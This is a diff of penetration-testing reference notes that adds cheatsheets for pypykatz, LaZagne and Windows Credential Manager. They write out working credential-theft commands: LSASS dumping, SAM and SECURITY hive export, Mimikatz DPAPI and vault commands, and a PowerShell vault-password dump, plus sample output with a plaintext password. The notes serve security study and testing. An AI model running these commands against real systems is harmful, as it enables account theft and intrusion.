@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-98be3c39.js";
+            window.path_to_searchindex_js = "searchindex-99db071c.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-f2f6bff2.js"></script>
+        <script src="toc-4d2bddd9.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -211,7 +211,13 @@
 <li><a href="#netcat-file-transfer">netcat</a></li>
 <li><a href="#rdp-file-transfer">rdp</a></li>
 <li><a href="#msfvenom-cheat-sheet">msfvenom</a></li>
-<li><a href="#john-the-ripper-cheatsheet">john the ripper</a></li>
+<li><a href="#john-the-ripper-cheatsheet">john the ripper</a>
+<ul>
+<li><a href="#pypykatz-cheatsheet">pypykatz</a></li>
+<li><a href="#lazagne-cheatsheet">lazagne</a></li>
+<li><a href="#windows-credential-manager-cheatsheet">windows-credential-manager</a></li>
+</ul>
+</li>
 </ul>
 </li>
 <li><a href="clouds/README.html">Clouds</a>
@@ -545,6 +551,8 @@
 <li><a href="#metasploit-framework">metasploit</a></li>
 <li><a href="#msfvenom">msfvenom</a></li>
 <li><a href="#john-the-ripper">john the ripper</a></li>
+<li><a href="#pypykatz">pypykatz</a></li>
+<li><a href="#lazagne">lazagne</a></li>
 </ul>
 </li>
 <li><a href="troubleshooting/README.html">Troubleshooting</a>
@@ -581,7 +589,7 @@
 <li><a href="#shell-harnesses">shell-harnesses</a></li>
 <li><a href="#shells-and-payloads">shell-payloads</a></li>
 <li><a href="#well-known-uris">well-known-uris</a></li>
-<li><a href="#enumeration">Enumeration</a></li>
+<li><a href="#enumeration-1">Enumeration</a></li>
 <li><a href="#footprinting-9">footprinting</a></li>
 <li><a href="#hydra-1">Brute-Forcing</a></li>
 <li><a href="#cve-common-vulnerabilities-and-exposures">CVE</a></li>
@@ -638,6 +646,10 @@
 <li><a href="#wafw00f-cheatsheet">wafw00f</a></li>
 <li><a href="#multi-line-strings">yaml</a></li>
 <li><a href="#john-the-ripper-cheatsheet">john</a></li>
+<li><a href="#windows-credential-manager-cheatsheet">windows-credential-manager</a></li>
+<li><a href="cheatsheets/ssh.html">ssh</a></li>
+<li><a href="#pypykatz-cheatsheet">pypykatz</a></li>
+<li><a href="#lazagne-cheatsheet">lazagne</a></li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="api-architectural-styles"><a class="header" href="#api-architectural-styles">API Architectural Styles</a></h1>
@@ -3201,6 +3213,385 @@ sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
 sudo umount /media/bitlockermount
 sudo umount /media/bitlocker
 </code></pre>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="pypykatz-cheatsheet"><a class="header" href="#pypykatz-cheatsheet">pypykatz Cheatsheet</a></h1>
+<h2 id="installation-1"><a class="header" href="#installation-1">Installation</a></h2>
+<pre><code class="language-bash">pip3 install pypykatz
+</code></pre>
+<hr>
+<h2 id="lsass-dump-analysis"><a class="header" href="#lsass-dump-analysis">LSASS Dump Analysis</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>pypykatz lsa minidump lsass.dmp</code></td><td>Parse LSASS dump</td></tr>
+<tr><td><code>pypykatz lsa minidump lsass.dmp -o json</code></td><td>JSON output</td></tr>
+<tr><td><code>pypykatz lsa minidump /path/ -r</code></td><td>Recursive directory</td></tr>
+<tr><td><code>pypykatz live lsa</code></td><td>Live LSASS (Windows, admin)</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="registry-hive-extraction"><a class="header" href="#registry-hive-extraction">Registry Hive Extraction</a></h2>
+<pre><code class="language-bash"># Full extraction
+pypykatz registry --sam SAM --security SECURITY --system SYSTEM
+
+# SAM only
+pypykatz registry --sam SAM --system SYSTEM
+
+# LSA secrets only
+pypykatz registry --security SECURITY --system SYSTEM
+</code></pre>
+<hr>
+<h2 id="dpapi--credential-manager"><a class="header" href="#dpapi--credential-manager">DPAPI / Credential Manager</a></h2>
+<h3 id="decrypt-credential-files"><a class="header" href="#decrypt-credential-files">Decrypt Credential Files</a></h3>
+<pre><code class="language-bash">pypykatz dpapi credential &lt;cred_file&gt; &lt;masterkey&gt;
+pypykatz dpapi credentials &lt;creds_dir&gt; --mkf &lt;masterkey_file&gt;
+</code></pre>
+<h3 id="decrypt-vault-credentials"><a class="header" href="#decrypt-vault-credentials">Decrypt Vault Credentials</a></h3>
+<pre><code class="language-bash">pypykatz dpapi vcrd &lt;vcrd_file&gt; &lt;masterkey&gt;
+</code></pre>
+<h3 id="decrypt-masterkey"><a class="header" href="#decrypt-masterkey">Decrypt Masterkey</a></h3>
+<pre><code class="language-bash"># With password
+pypykatz dpapi masterkey &lt;masterkey_file&gt; -p &lt;password&gt;
+
+# With domain backup key
+pypykatz dpapi masterkey &lt;masterkey_file&gt; --pvk &lt;backup.pvk&gt;
+
+# Generate prekey
+pypykatz dpapi prekey password &lt;SID&gt; &lt;password&gt;
+</code></pre>
+<hr>
+<h2 id="quick-reference-1"><a class="header" href="#quick-reference-1">Quick Reference</a></h2>
+<h3 id="create-lsass-dump-windows"><a class="header" href="#create-lsass-dump-windows">Create LSASS Dump (Windows)</a></h3>
+<pre><code class="language-cmd">procdump.exe -ma lsass.exe lsass.dmp
+</code></pre>
+<pre><code class="language-cmd">rundll32 comsvcs.dll MiniDump &lt;PID&gt; lsass.dmp full
+</code></pre>
+<h3 id="export-registry-hives-windows"><a class="header" href="#export-registry-hives-windows">Export Registry Hives (Windows)</a></h3>
+<pre><code class="language-cmd">reg save HKLM\SAM SAM
+reg save HKLM\SECURITY SECURITY
+reg save HKLM\SYSTEM SYSTEM
+</code></pre>
+<hr>
+<h2 id="credential-locations"><a class="header" href="#credential-locations">Credential Locations</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Type</th><th>Path</th></tr>
+</thead>
+<tbody>
+<tr><td>User Credentials</td><td><code>%AppData%\Microsoft\Credentials\</code></td></tr>
+<tr><td>User Vault</td><td><code>%AppData%\Microsoft\Vault\</code></td></tr>
+<tr><td>User Masterkeys</td><td><code>%AppData%\Microsoft\Protect\&lt;SID&gt;\</code></td></tr>
+<tr><td>System Credentials</td><td><code>%SystemRoot%\System32\config\systemprofile\...</code></td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="output-formats"><a class="header" href="#output-formats">Output Formats</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Format</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-o text</code></td><td>Human-readable (default)</td></tr>
+<tr><td><code>-o json</code></td><td>JSON</td></tr>
+<tr><td><code>-o grep</code></td><td>Grep-friendly</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="common-workflows"><a class="header" href="#common-workflows">Common Workflows</a></h2>
+<h3 id="offline-lsass-analysis"><a class="header" href="#offline-lsass-analysis">Offline LSASS Analysis</a></h3>
+<pre><code class="language-bash"># 1. Dump on target
+procdump.exe -ma lsass.exe lsass.dmp
+
+# 2. Analyze on attacker (any OS)
+pypykatz lsa minidump lsass.dmp
+</code></pre>
+<h3 id="credential-manager-extraction"><a class="header" href="#credential-manager-extraction">Credential Manager Extraction</a></h3>
+<pre><code class="language-bash"># 1. Get masterkeys from LSASS
+pypykatz lsa minidump lsass.dmp | grep -i dpapi
+
+# 2. Decrypt credential file
+pypykatz dpapi credential &lt;cred_file&gt; &lt;guid&gt;:&lt;key_hex&gt;
+</code></pre>
+<hr>
+<h2 id="related-tools"><a class="header" href="#related-tools">Related Tools</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Tool</th><th>Use Case</th></tr>
+</thead>
+<tbody>
+<tr><td>Mimikatz</td><td>Live Windows attacks</td></tr>
+<tr><td>LaZagne</td><td>Application credentials</td></tr>
+<tr><td>Impacket</td><td>Remote attacks</td></tr>
+</tbody>
+</table>
+</div>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="lazagne-cheatsheet"><a class="header" href="#lazagne-cheatsheet">LaZagne Cheatsheet</a></h1>
+<h2 id="installation-2"><a class="header" href="#installation-2">Installation</a></h2>
+<pre><code class="language-bash"># Windows: Download from releases
+https://github.com/AlessandroZ/LaZagne/releases
+
+# Linux/macOS
+pip3 install -r requirements.txt
+python3 laZagne.py all
+</code></pre>
+<hr>
+<h2 id="basic-commands-1"><a class="header" href="#basic-commands-1">Basic Commands</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>laZagne.exe all</code></td><td>Extract all credentials</td></tr>
+<tr><td><code>laZagne.exe all -quiet</code></td><td>Passwords only</td></tr>
+<tr><td><code>laZagne.exe all -oJ</code></td><td>JSON output</td></tr>
+<tr><td><code>laZagne.exe all -oN</code></td><td>Text file output</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="module-categories"><a class="header" href="#module-categories">Module Categories</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Category</th><th>Command</th></tr>
+</thead>
+<tbody>
+<tr><td>Browsers</td><td><code>laZagne.exe browsers</code></td></tr>
+<tr><td>Windows Creds</td><td><code>laZagne.exe windows</code></td></tr>
+<tr><td>Sysadmin Tools</td><td><code>laZagne.exe sysadmin</code></td></tr>
+<tr><td>Email Clients</td><td><code>laZagne.exe mails</code></td></tr>
+<tr><td>Databases</td><td><code>laZagne.exe databases</code></td></tr>
+<tr><td>WiFi</td><td><code>laZagne.exe wifi</code></td></tr>
+<tr><td>Git</td><td><code>laZagne.exe git</code></td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="windows-credential-manager"><a class="header" href="#windows-credential-manager">Windows Credential Manager</a></h2>
+<h3 id="extract-all-windows-credentials"><a class="header" href="#extract-all-windows-credentials">Extract All Windows Credentials</a></h3>
+<pre><code class="language-bash">laZagne.exe windows
+</code></pre>
+<h3 id="specific-windows-modules"><a class="header" href="#specific-windows-modules">Specific Windows Modules</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Module</th><th>Command</th></tr>
+</thead>
+<tbody>
+<tr><td>Credential Manager</td><td><code>laZagne.exe windows -m credman</code></td></tr>
+<tr><td>Windows Vault</td><td><code>laZagne.exe windows -m vault</code></td></tr>
+<tr><td>DPAPI Secrets</td><td><code>laZagne.exe windows -m dpapi</code></td></tr>
+<tr><td>Auto-logon</td><td><code>laZagne.exe windows -m autologon</code></td></tr>
+<tr><td>Cached Creds</td><td><code>laZagne.exe windows -m cachedump</code></td></tr>
+<tr><td>SAM Hashes</td><td><code>laZagne.exe windows -m hashdump</code></td></tr>
+<tr><td>LSA Secrets</td><td><code>laZagne.exe windows -m lsa_secrets</code></td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="with-user-password-dpapi"><a class="header" href="#with-user-password-dpapi">With User Password (DPAPI)</a></h3>
+<pre><code class="language-bash">laZagne.exe windows -password 'UserPassword123'
+</code></pre>
+<hr>
+<h2 id="browser-credentials"><a class="header" href="#browser-credentials">Browser Credentials</a></h2>
+<pre><code class="language-bash"># All browsers
+laZagne.exe browsers
+
+# Specific browser
+laZagne.exe browsers -m chrome
+laZagne.exe browsers -m firefox
+laZagne.exe browsers -m chromiumedge
+</code></pre>
+<hr>
+<h2 id="output-options-2"><a class="header" href="#output-options-2">Output Options</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-quiet</code></td><td>Only show passwords</td></tr>
+<tr><td><code>-oN</code></td><td>Save as text file</td></tr>
+<tr><td><code>-oJ</code></td><td>Save as JSON</td></tr>
+<tr><td><code>-oA</code></td><td>Save all formats</td></tr>
+<tr><td><code>-output &lt;dir&gt;</code></td><td>Specify output directory</td></tr>
+<tr><td><code>-v</code></td><td>Verbose</td></tr>
+<tr><td><code>-vv</code></td><td>Extra verbose</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="advanced-options-1"><a class="header" href="#advanced-options-1">Advanced Options</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-user &lt;name&gt;</code></td><td>Target specific user</td></tr>
+<tr><td><code>-password &lt;pass&gt;</code></td><td>DPAPI decryption password</td></tr>
+<tr><td><code>-local</code></td><td>Offline mode</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="offline-extraction"><a class="header" href="#offline-extraction">Offline Extraction</a></h3>
+<pre><code class="language-bash">laZagne.exe all -local -sam SAM -security SECURITY -system SYSTEM
+</code></pre>
+<hr>
+<h2 id="quick-one-liners"><a class="header" href="#quick-one-liners">Quick One-Liners</a></h2>
+<h3 id="quiet-json-dump"><a class="header" href="#quiet-json-dump">Quiet JSON Dump</a></h3>
+<pre><code class="language-bash">laZagne.exe all -quiet -oJ
+</code></pre>
+<h3 id="windows-creds-only"><a class="header" href="#windows-creds-only">Windows Creds Only</a></h3>
+<pre><code class="language-bash">laZagne.exe windows -m credman -m vault -quiet
+</code></pre>
+<h3 id="all-browsers"><a class="header" href="#all-browsers">All Browsers</a></h3>
+<pre><code class="language-bash">laZagne.exe browsers -quiet
+</code></pre>
+<hr>
+<h2 id="linux-commands"><a class="header" href="#linux-commands">Linux Commands</a></h2>
+<pre><code class="language-bash">python3 laZagne.py all
+python3 laZagne.py browsers
+python3 laZagne.py sysadmin
+python3 laZagne.py memory
+</code></pre>
+<hr>
+<h2 id="related-tools-1"><a class="header" href="#related-tools-1">Related Tools</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Tool</th><th>Use Case</th></tr>
+</thead>
+<tbody>
+<tr><td>Mimikatz</td><td>LSASS memory extraction</td></tr>
+<tr><td>pypykatz</td><td>Offline LSASS analysis</td></tr>
+<tr><td>SharpDPAPI</td><td>C# DPAPI attacks</td></tr>
+</tbody>
+</table>
+</div>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="windows-credential-manager-cheatsheet"><a class="header" href="#windows-credential-manager-cheatsheet">Windows Credential Manager Cheatsheet</a></h1>
+<h2 id="credential-storage-locations"><a class="header" href="#credential-storage-locations">Credential Storage Locations</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Path</th><th>Scope</th></tr>
+</thead>
+<tbody>
+<tr><td><code>%UserProfile%\AppData\Local\Microsoft\Vault\</code></td><td>User</td></tr>
+<tr><td><code>%UserProfile%\AppData\Local\Microsoft\Credentials\</code></td><td>User</td></tr>
+<tr><td><code>%UserProfile%\AppData\Roaming\Microsoft\Vault\</code></td><td>User</td></tr>
+<tr><td><code>%ProgramData%\Microsoft\Vault\</code></td><td>System</td></tr>
+<tr><td><code>%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\</code></td><td>System</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="credential-types"><a class="header" href="#credential-types">Credential Types</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Type</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td>Web Credentials</td><td>Websites/online accounts (IE, legacy Edge)</td></tr>
+<tr><td>Windows Credentials</td><td>Domain users, services, network resources</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h2>
+<h3 id="list-stored-credentials-cmdkey"><a class="header" href="#list-stored-credentials-cmdkey">List Stored Credentials (cmdkey)</a></h3>
+<pre><code class="language-cmd">cmdkey /list
+</code></pre>
+<h3 id="output-fields"><a class="header" href="#output-fields">Output Fields</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Field</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td>Target</td><td>Resource/account name</td></tr>
+<tr><td>Type</td><td><code>Generic</code> or <code>Domain Password</code></td></tr>
+<tr><td>User</td><td>Associated account</td></tr>
+<tr><td>Persistence</td><td><code>Local machine persistence</code> = survives reboots</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="exploitation"><a class="header" href="#exploitation">Exploitation</a></h2>
+<h3 id="impersonate-stored-user-runas"><a class="header" href="#impersonate-stored-user-runas">Impersonate Stored User (runas)</a></h3>
+<pre><code class="language-cmd">runas /savecred /user:DOMAIN\username cmd
+</code></pre>
+<h3 id="export-vaults-gui"><a class="header" href="#export-vaults-gui">Export Vaults (GUI)</a></h3>
+<pre><code class="language-cmd">rundll32 keymgr.dll,KRShowKeyMgr
+</code></pre>
+<hr>
+<h2 id="mimikatz-commands"><a class="header" href="#mimikatz-commands">Mimikatz Commands</a></h2>
+<h3 id="dump-credentials-from-lsass"><a class="header" href="#dump-credentials-from-lsass">Dump Credentials from LSASS</a></h3>
+<pre><code>privilege::debug
+sekurlsa::credman
+</code></pre>
+<h3 id="list-vault-credentials"><a class="header" href="#list-vault-credentials">List Vault Credentials</a></h3>
+<pre><code>vault::list
+vault::cred
+</code></pre>
+<h3 id="dpapi-masterkey-extraction"><a class="header" href="#dpapi-masterkey-extraction">DPAPI Masterkey Extraction</a></h3>
+<pre><code>sekurlsa::dpapi
+dpapi::masterkey /in:&lt;masterkey_file&gt; /rpc
+</code></pre>
+<h3 id="decrypt-credential-file"><a class="header" href="#decrypt-credential-file">Decrypt Credential File</a></h3>
+<pre><code>dpapi::cred /in:&lt;credential_file&gt;
+</code></pre>
+<hr>
+<h2 id="powershell-enumeration"><a class="header" href="#powershell-enumeration">PowerShell Enumeration</a></h2>
+<h3 id="list-web-credentials"><a class="header" href="#list-web-credentials">List Web Credentials</a></h3>
+<pre><code class="language-powershell">[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+$vault = New-Object Windows.Security.Credentials.PasswordVault
+$vault.RetrieveAll() | % { $_.RetrievePassword(); $_ }
+</code></pre>
+<h3 id="list-windows-credentials"><a class="header" href="#list-windows-credentials">List Windows Credentials</a></h3>
+<pre><code class="language-powershell">cmdkey /list
+</code></pre>
+<hr>
+<h2 id="related-tools-2"><a class="header" href="#related-tools-2">Related Tools</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Tool</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td>Mimikatz</td><td>Credential extraction from memory/DPAPI</td></tr>
+<tr><td>SharpDPAPI</td><td>C# DPAPI attacks</td></tr>
+<tr><td>LaZagne</td><td>Multi-platform credential recovery</td></tr>
+<tr><td>DonPAPI</td><td>Remote DPAPI extraction</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="key-files"><a class="header" href="#key-files">Key Files</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>File</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td><code>Policy.vpol</code></td><td>Contains AES keys (protected by DPAPI)</td></tr>
+<tr><td><code>*.vcrd</code></td><td>Vault credential files</td></tr>
+<tr><td>Master key files</td><td>Located in <code>%AppData%\Microsoft\Protect\&lt;SID&gt;\</code></td></tr>
+</tbody>
+</table>
+</div>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="clouds"><a class="header" href="#clouds">Clouds</a></h1>
 <p>Notes related to various cloud service providers.</p>
@@ -23565,6 +23956,8 @@ PID        TTY     STAT   TIME          CMD
 <li><a href="#metasploit-framework">metasploit</a></li>
 <li><a href="#hashcat">hashcat</a></li>
 <li><a href="#john-the-ripper">john</a></li>
+<li><a href="#pypykatz">pypykatz</a></li>
+<li><a href="#lazagne">lazagne</a></li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="need-to-addrefine"><a class="header" href="#need-to-addrefine">Need to add/refine:</a></h1>
@@ -23845,7 +24238,7 @@ customEvents
 <li><strong>Ease of Use</strong>: Straightforward command-line interface with clear syntax</li>
 </ul>
 <hr>
-<h2 id="installation-1"><a class="header" href="#installation-1">Installation</a></h2>
+<h2 id="installation-3"><a class="header" href="#installation-3">Installation</a></h2>
 <p>Medusa often comes pre-installed on popular penetration testing distributions. You can verify its presence by running:</p>
 <pre><code class="language-sh">medusa -h
 </code></pre>
@@ -24014,7 +24407,7 @@ sudo apt-get -y install medusa
 <li><strong>Ease of Use</strong>: Hydra is relatively easy to use despite its power, with a straightforward command-line interface and clear syntax.</li>
 </ul>
 <hr>
-<h2 id="installation-2"><a class="header" href="#installation-2">Installation</a></h2>
+<h2 id="installation-4"><a class="header" href="#installation-4">Installation</a></h2>
 <p>Hydra often comes pre-installed on popular penetration testing distributions. You can verify its presence by running:</p>
 <pre><code class="language-sh">hydra -h
 </code></pre>
@@ -26250,7 +26643,7 @@ run -j
 <p>The “jumbo” variant is recommended for penetration testing uses, as it has performance optimizations, additional features such as multilingual word lists, and support for 64-bit architectures. This version is able to crack passwords with greater accuracy and speed.</p>
 <p>Included with JtR are various tools for converting different types of files and hashes into formats that are usable by JtR. Additionally, the software is regularly updated to keep up with the current security trends and technologies.</p>
 <hr>
-<h2 id="installation-3"><a class="header" href="#installation-3">Installation</a></h2>
+<h2 id="installation-5"><a class="header" href="#installation-5">Installation</a></h2>
 <p>John the Ripper often comes pre-installed on penetration testing distributions like Kali Linux. You can verify its presence by running:</p>
 <pre><code class="language-sh">john --help
 </code></pre>
@@ -26582,6 +26975,517 @@ sudo umount /media/bitlocker
 <li>Use <code>--session</code> and <code>--restore</code> for long-running cracks that may be interrupted.</li>
 <li>Use <code>--show</code> to display previously cracked passwords from the pot file.</li>
 <li>The jumbo version includes more formats, rules, and optimizations for better performance.</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="pypykatz"><a class="header" href="#pypykatz">pypykatz</a></h1>
+<p>pypykatz is a Python implementation of Mimikatz, allowing credential extraction and DPAPI attacks without requiring native Windows binaries. It can parse LSASS dumps offline (cross-platform) or attack live systems on Windows. This makes it ideal for situations where running the original Mimikatz is not possible or would trigger detection.</p>
+<h2 id="key-capabilities"><a class="header" href="#key-capabilities">Key Capabilities</a></h2>
+<ul>
+<li><strong>Offline Analysis</strong>: Parse LSASS memory dumps from any OS (Linux, macOS, Windows)</li>
+<li><strong>Live LSASS Access</strong>: Extract credentials from running LSASS process (Windows only)</li>
+<li><strong>DPAPI Attacks</strong>: Decrypt DPAPI-protected secrets including Credential Manager</li>
+<li><strong>Registry Parsing</strong>: Extract secrets from SAM, SECURITY, and SYSTEM hives</li>
+<li><strong>Cross-Platform</strong>: Works on Linux, macOS, and Windows</li>
+</ul>
+<hr>
+<h2 id="installation-6"><a class="header" href="#installation-6">Installation</a></h2>
+<pre><code class="language-bash"># Via pip
+pip3 install pypykatz
+
+# From GitHub
+git clone https://github.com/skelsec/pypykatz.git
+cd pypykatz
+pip3 install .
+</code></pre>
+<hr>
+<h2 id="basic-usage-2"><a class="header" href="#basic-usage-2">Basic Usage</a></h2>
+<h3 id="parse-lsass-memory-dump"><a class="header" href="#parse-lsass-memory-dump">Parse LSASS Memory Dump</a></h3>
+<pre><code class="language-bash">pypykatz lsa minidump lsass.dmp
+</code></pre>
+<h3 id="parse-lsass-dump-json-output"><a class="header" href="#parse-lsass-dump-json-output">Parse LSASS Dump (JSON Output)</a></h3>
+<pre><code class="language-bash">pypykatz lsa minidump lsass.dmp -o json &gt; creds.json
+</code></pre>
+<h3 id="live-lsass-extraction-windows-requires-admin"><a class="header" href="#live-lsass-extraction-windows-requires-admin">Live LSASS Extraction (Windows, requires admin)</a></h3>
+<pre><code class="language-bash">pypykatz live lsa
+</code></pre>
+<h3 id="parse-registry-hives-offline"><a class="header" href="#parse-registry-hives-offline">Parse Registry Hives Offline</a></h3>
+<pre><code class="language-bash">pypykatz registry --sam SAM --security SECURITY --system SYSTEM
+</code></pre>
+<hr>
+<h2 id="credential-manager--dpapi-attacks"><a class="header" href="#credential-manager--dpapi-attacks">Credential Manager / DPAPI Attacks</a></h2>
+<h3 id="decrypt-credential-files-1"><a class="header" href="#decrypt-credential-files-1">Decrypt Credential Files</a></h3>
+<pre><code class="language-bash"># Decrypt a single credential file
+pypykatz dpapi credential &lt;credential_file&gt; &lt;masterkey&gt;
+
+# Decrypt all credentials in a directory
+pypykatz dpapi credentials &lt;credentials_dir&gt; --mkf &lt;masterkey_file&gt;
+</code></pre>
+<h3 id="decrypt-vault-credentials-1"><a class="header" href="#decrypt-vault-credentials-1">Decrypt Vault Credentials</a></h3>
+<pre><code class="language-bash">pypykatz dpapi vcrd &lt;vcrd_file&gt; &lt;masterkey&gt;
+</code></pre>
+<h3 id="extract-dpapi-masterkeys-from-lsass-dump"><a class="header" href="#extract-dpapi-masterkeys-from-lsass-dump">Extract DPAPI Masterkeys from LSASS Dump</a></h3>
+<pre><code class="language-bash">pypykatz lsa minidump lsass.dmp | grep -A5 "dpapi"
+</code></pre>
+<h3 id="decrypt-masterkey-file"><a class="header" href="#decrypt-masterkey-file">Decrypt Masterkey File</a></h3>
+<pre><code class="language-bash"># With user password
+pypykatz dpapi masterkey &lt;masterkey_file&gt; -p &lt;password&gt;
+
+# With domain backup key
+pypykatz dpapi masterkey &lt;masterkey_file&gt; --pvk &lt;domain_backup_key.pvk&gt;
+
+# With SID and password
+pypykatz dpapi prekey password &lt;SID&gt; &lt;password&gt;
+</code></pre>
+<hr>
+<h2 id="lsass-dump-analysis-1"><a class="header" href="#lsass-dump-analysis-1">LSASS Dump Analysis</a></h2>
+<h3 id="full-credential-dump"><a class="header" href="#full-credential-dump">Full Credential Dump</a></h3>
+<pre><code class="language-bash">pypykatz lsa minidump lsass.dmp
+</code></pre>
+<h3 id="output-formats-1"><a class="header" href="#output-formats-1">Output Formats</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-o json</code></td><td>JSON output</td></tr>
+<tr><td><code>-o grep</code></td><td>Grep-friendly output</td></tr>
+<tr><td><code>-o text</code></td><td>Human-readable text (default)</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="parse-multiple-dumps"><a class="header" href="#parse-multiple-dumps">Parse Multiple Dumps</a></h3>
+<pre><code class="language-bash">pypykatz lsa minidump dump1.dmp dump2.dmp dump3.dmp
+</code></pre>
+<h3 id="recursive-directory-parsing"><a class="header" href="#recursive-directory-parsing">Recursive Directory Parsing</a></h3>
+<pre><code class="language-bash">pypykatz lsa minidump /path/to/dumps/ -r
+</code></pre>
+<hr>
+<h2 id="registry-attacks"><a class="header" href="#registry-attacks">Registry Attacks</a></h2>
+<h3 id="dump-sam-database"><a class="header" href="#dump-sam-database">Dump SAM Database</a></h3>
+<pre><code class="language-bash">pypykatz registry --sam SAM --system SYSTEM
+</code></pre>
+<h3 id="dump-lsa-secrets"><a class="header" href="#dump-lsa-secrets">Dump LSA Secrets</a></h3>
+<pre><code class="language-bash">pypykatz registry --security SECURITY --system SYSTEM
+</code></pre>
+<h3 id="dump-cached-domain-credentials"><a class="header" href="#dump-cached-domain-credentials">Dump Cached Domain Credentials</a></h3>
+<pre><code class="language-bash">pypykatz registry --security SECURITY --system SYSTEM
+</code></pre>
+<h3 id="full-registry-extraction"><a class="header" href="#full-registry-extraction">Full Registry Extraction</a></h3>
+<pre><code class="language-bash">pypykatz registry --sam SAM --security SECURITY --system SYSTEM
+</code></pre>
+<hr>
+<h2 id="common-workflows-1"><a class="header" href="#common-workflows-1">Common Workflows</a></h2>
+<h3 id="workflow-1-offline-lsass-analysis"><a class="header" href="#workflow-1-offline-lsass-analysis">Workflow 1: Offline LSASS Analysis</a></h3>
+<pre><code class="language-bash"># On target: Create minidump (various methods)
+procdump.exe -ma lsass.exe lsass.dmp
+# or: rundll32 comsvcs.dll MiniDump &lt;PID&gt; lsass.dmp full
+# or: Task Manager &gt; Details &gt; lsass.exe &gt; Create dump file
+
+# On attacker machine (any OS)
+pypykatz lsa minidump lsass.dmp
+</code></pre>
+<h3 id="workflow-2-credential-manager-extraction"><a class="header" href="#workflow-2-credential-manager-extraction">Workflow 2: Credential Manager Extraction</a></h3>
+<pre><code class="language-bash"># 1. Locate credential files
+# User credentials: %AppData%\Microsoft\Credentials\
+# System credentials: %SystemRoot%\System32\config\systemprofile\...
+
+# 2. Locate masterkey files
+# %AppData%\Microsoft\Protect\&lt;SID&gt;\
+
+# 3. Get masterkey from LSASS dump
+pypykatz lsa minidump lsass.dmp | grep -i dpapi
+
+# 4. Decrypt credential file
+pypykatz dpapi credential &lt;credential_file&gt; &lt;masterkey_guid&gt;:&lt;masterkey_hex&gt;
+</code></pre>
+<h3 id="workflow-3-offline-registry-attack"><a class="header" href="#workflow-3-offline-registry-attack">Workflow 3: Offline Registry Attack</a></h3>
+<pre><code class="language-bash"># On target: Export registry hives (requires admin)
+reg save HKLM\SAM SAM
+reg save HKLM\SECURITY SECURITY
+reg save HKLM\SYSTEM SYSTEM
+
+# On attacker machine
+pypykatz registry --sam SAM --security SECURITY --system SYSTEM
+</code></pre>
+<hr>
+<h2 id="output-examples"><a class="header" href="#output-examples">Output Examples</a></h2>
+<h3 id="lsass-dump-output"><a class="header" href="#lsass-dump-output">LSASS Dump Output</a></h3>
+<pre><code>== LogonSession ==
+authentication_id 630472 (99ec8)
+session_id 3
+username mcharles
+domainname SRV01
+logon_server SRV01
+logon_time 2025-04-27T02:40:32
+sid S-1-5-21-1340203682-1669575078-4153855890-1002
+        == CREDMAN [00000000] ==
+        username mcharles@inlanefreight.local
+        domain onedrive.live.com
+        password p@ssw0rd123!
+</code></pre>
